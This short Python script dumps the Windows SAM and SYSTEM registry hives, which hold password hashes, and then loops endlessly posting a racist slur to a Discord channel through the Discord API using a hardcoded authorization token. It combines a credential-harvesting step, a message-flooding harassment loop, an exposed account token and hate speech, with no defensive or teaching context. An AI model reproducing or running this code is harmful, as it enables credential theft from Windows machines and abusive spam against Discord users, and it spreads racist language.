import os 
import requests
import time
import subprocess


#download the hashes or wtvvv
os.system('reg save HKLM\sam ./sam.save')
os.system('reg save HKLM\system ./system.save')

networks = "HELLO YOU BITCH ASS NIGGERS"

while True:
  payload = {'content': networks}
  header = {
    'authorization':
    'NjcwNjkyODE5NTgwNjE2Nzc0.GOuQwS.hLxKhbbURxw5bIz689g0ps7OGbVk5j61ltBDiA'
    }

  r = requests.post(
    "https://discord.com/api/v9/channels/1124170801814450247/messages",
    data=payload,
    headers=header)
